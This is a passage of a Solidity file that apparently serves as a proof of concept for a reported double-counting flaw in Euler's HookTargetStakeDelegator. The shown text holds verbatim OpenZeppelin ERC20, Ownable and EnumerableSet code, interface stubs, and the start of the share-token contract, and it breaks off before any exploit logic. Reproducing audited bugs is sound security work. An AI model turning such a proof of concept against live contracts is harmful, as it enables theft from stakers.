// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.24;

// ============================================================================
// Synthetic PoC for AuditVault #55523 — Euler HookTargetStakeDelegator
// "Double-counting of the migrated stake" (MixBytes).
// The REAL audited HookTargetStakeDelegator + ERC20ShareRepresentation are
// inlined verbatim (imports/pragma stripped). Only the opaque external
// boundaries (Berachain RewardVault + factory, EVault, EVC) are represented
// by faithful minimal doubles. Cheatcode-free, single file.
// ============================================================================

// ---- OpenZeppelin: interfaces/draft-IERC6093.sol (real, verbatim) ----
// OpenZeppelin Contracts (last updated v5.1.0) (interfaces/draft-IERC6093.sol)

/**
 * @dev Standard ERC-20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.
 */
interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}

/**
 * @dev Standard ERC-721 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.
 */
interface IERC721Errors {
    /**
     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in ERC-20.
     * Used in balance queries.
     * @param owner Address of the current owner of a token.
     */
    error ERC721InvalidOwner(address owner);

    /**
     * @dev Indicates a `tokenId` whose `owner` is the zero address.
     * @param tokenId Identifier number of a token.
     */
    error ERC721NonexistentToken(uint256 tokenId);

    /**
     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param tokenId Identifier number of a token.
     * @param owner Address of the current owner of a token.
     */
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC721InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC721InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param tokenId Identifier number of a token.
     */
    error ERC721InsufficientApproval(address operator, uint256 tokenId);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC721InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC721InvalidOperator(address operator);
}

/**
 * @dev Standard ERC-1155 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.
 */
interface IERC1155Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     * @param tokenId Identifier number of a token.
     */
    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC1155InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC1155InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param owner Address of the current owner of a token.
     */
    error ERC1155MissingApprovalForAll(address operator, address owner);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC1155InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC1155InvalidOperator(address operator);

    /**
     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
     * Used in batch transfers.
     * @param idsLength Length of the array of token identifiers
     * @param valuesLength Length of the array of token amounts
     */
    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}

// ---- OpenZeppelin: token/ERC20/IERC20.sol (real, verbatim) ----
// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)


/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// ---- OpenZeppelin: token/ERC20/extensions/IERC20Metadata.sol (real, verbatim) ----
// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/IERC20Metadata.sol)



/**
 * @dev Interface for the optional metadata functions from the ERC-20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// ---- OpenZeppelin: utils/Context.sol (real, verbatim) ----
// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

// ---- OpenZeppelin: token/ERC20/ERC20.sol (real, verbatim) ----
// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/ERC20.sol)



/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC-20
 * applications.
 */
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Skips emitting an {Approval} event indicating an allowance update. This is not
     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     *
     * ```solidity
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

// ---- OpenZeppelin: access/Ownable.sol (real, verbatim) ----
// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)



/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// ---- OpenZeppelin: utils/structs/EnumerableSet.sol (real, verbatim) ----
// OpenZeppelin Contracts (last updated v5.1.0) (utils/structs/EnumerableSet.sol)
// This file was procedurally generated from scripts/generate/templates/EnumerableSet.js.


/**
 * @dev Library for managing
 * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive
 * types.
 *
 * Sets have the following properties:
 *
 * - Elements are added, removed, and checked for existence in constant time
 * (O(1)).
 * - Elements are enumerated in O(n). No guarantees are made on the ordering.
 *
 * ```solidity
 * contract Example {
 *     // Add the library methods
 *     using EnumerableSet for EnumerableSet.AddressSet;
 *
 *     // Declare a set state variable
 *     EnumerableSet.AddressSet private mySet;
 * }
 * ```
 *
 * As of v3.3.0, sets of type `bytes32` (`Bytes32Set`), `address` (`AddressSet`)
 * and `uint256` (`UintSet`) are supported.
 *
 * [WARNING]
 * ====
 * Trying to delete such a structure from storage will likely result in data corruption, rendering the structure
 * unusable.
 * See https://github.com/ethereum/solidity/pull/11843[ethereum/solidity#11843] for more info.
 *
 * In order to clean an EnumerableSet, you can either remove all elements one by one or create a fresh instance using an
 * array of EnumerableSet.
 * ====
 */
library EnumerableSet {
    // To implement this library for multiple types with as little code
    // repetition as possible, we write it in terms of a generic Set type with
    // bytes32 values.
    // The Set implementation uses private functions, and user-facing
    // implementations (such as AddressSet) are just wrappers around the
    // underlying Set.
    // This means that we can only create new EnumerableSets for types that fit
    // in bytes32.

    struct Set {
        // Storage of set values
        bytes32[] _values;
        // Position is the index of the value in the `values` array plus 1.
        // Position 0 is used to mean a value is not in the set.
        mapping(bytes32 value => uint256) _positions;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            // The value is stored at length-1, but we add 1 to all indexes
            // and use 0 as a sentinel value
            set._positions[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        // We cache the value's position to prevent multiple reads from the same storage slot
        uint256 position = set._positions[value];

        if (position != 0) {
            // Equivalent to contains(set, value)
            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
            // the array, and then remove the last element (sometimes called as 'swap and pop').
            // This modifies the order of the array, as noted in {at}.

            uint256 valueIndex = position - 1;
            uint256 lastIndex = set._values.length - 1;

            if (valueIndex != lastIndex) {
                bytes32 lastValue = set._values[lastIndex];

                // Move the lastValue to the index where the value to delete is
                set._values[valueIndex] = lastValue;
                // Update the tracked position of the lastValue (that was just moved)
                set._positions[lastValue] = position;
            }

            // Delete the slot where the moved value was stored
            set._values.pop();

            // Delete the tracked position for the deleted slot
            delete set._positions[value];

            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._positions[value] != 0;
    }

    /**
     * @dev Returns the number of values on the set. O(1).
     */
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        return set._values[index];
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function _values(Set storage set) private view returns (bytes32[] memory) {
        return set._values;
    }

    // Bytes32Set

    struct Bytes32Set {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(Bytes32Set storage set) internal view returns (bytes32[] memory) {
        bytes32[] memory store = _values(set._inner);
        bytes32[] memory result;

        assembly ("memory-safe") {
            result := store
        }

        return result;
    }

    // AddressSet

    struct AddressSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(AddressSet storage set) internal view returns (address[] memory) {
        bytes32[] memory store = _values(set._inner);
        address[] memory result;

        assembly ("memory-safe") {
            result := store
        }

        return result;
    }

    // UintSet

    struct UintSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(UintSet storage set) internal view returns (uint256[] memory) {
        bytes32[] memory store = _values(set._inner);
        uint256[] memory result;

        assembly ("memory-safe") {
            result := store
        }

        return result;
    }
}

// ---- Minimal evk/evc interface stubs (only the members the hook uses) ----
interface IHookTarget {
    function isHookTarget() external view returns (bytes4);
}

interface IEVault {
    function EVC() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function protocolConfigAddress() external view returns (address);
    function feeReceiver() external view returns (address);
}

interface IEVC {
    function getAccountOwner(address account) external view returns (address);
}

interface ProtocolConfig {
    function protocolFeeConfig(address vault) external view returns (address, uint16);
}

// ==== REAL AUDITED SOURCE (byte-identical logic; imports stripped) ====
/// @title IRewardVaultFactory Interface
/// @dev Based on https://github.com/berachain/contracts/blob/main/src/pol/interfaces/IRewardVaultFactory.sol
interface IRewardVaultFactory {
    /// @notice Creates a new reward vault vault for the given staking token.
    /// @dev Reverts if the staking token is not a contract.
    /// @param stakingToken The address of the staking token.
    /// @return The address of the new vault.
    function createRewardVault(address stakingToken) external returns (address);

    /// @notice Predicts the address for a given staking token
    /// @param stakingToken The address of the staking token
    /// @return The address of the reward vault
    function predictRewardVaultAddress(address stakingToken) external view returns (address);
}

/// @title IRewardVault Interface
/// @dev Based on https://github.com/berachain/contracts/blob/main/src/pol/interfaces/IRewardVault.sol
interface IRewardVault {
    /// @notice Get the amount staked by a delegate on behalf of an account
    /// @param account The account address to check
    /// @param delegate The delegate address to check
    /// @return The amount staked by the delegate for the account
    function getDelegateStake(address account, address delegate) external view returns (uint256);

    /// @notice Stake tokens on behalf of another account
    /// @param account The account to stake for
    /// @param amount The amount of tokens to stake
    function delegateStake(address account, uint256 amount) external;

    /// @notice Withdraw tokens staked on behalf of another account
    /// @param account The account to withdraw for
    /// @param amount The amount of tokens to withdraw
    function delegateWithdraw(address account, uint256 amount) external;
}

/// @title ERC20ShareRepresentation
/// @custom:security-contact security@euler.xyz
/// @author Euler Labs (https://www.eulerlabs.com/)
/// @notice ERC20 token representing EVault shares which is automatically delegate staked in a reward vault.
/// This token is minted and burned in sync with EVault share operations (deposit, mint, withdraw, redeem).
/// When minted, the tokens are automatically delegate staked on behalf of the user by the HookTarget, allowing users to
/// participate in Berachain's Proof of Liquidity (POL) while still being able to use the EVault shares as collateral.
/// The token is owned and controlled exclusively by the HookTarget contract.
contract ERC20ShareRepresentation is Ownable, ERC20 {
    /// @notice Creates a new share representation token for an EVault
    /// @param _eVault The address of the EVault this token is associated with
    /// @dev The token name and symbol are derived from the EVault's name and symbol with "-STAKE" suffix
    constructor(address _eVault)
        Ownable(msg.sender)
        ERC20(
            string(abi.encodePacked(ERC20(_eVault).name(), "-STAKE")),
            string(abi.encodePacked(ERC20(_eVault).symbol(), "-STAKE"))
        )
    {}

    /// @notice Mints new share representation tokens
    /// @dev Only callable by the owner (HookTarget contract)
    /// @param _amount Amount of tokens to mint
    function mint(uint256 _amount) external onlyOwner {
        _mint(owner(), _amount);
    }

    /// @notice Burns share representation tokens
    /// @dev Only callable by the owner (HookTarget contract)
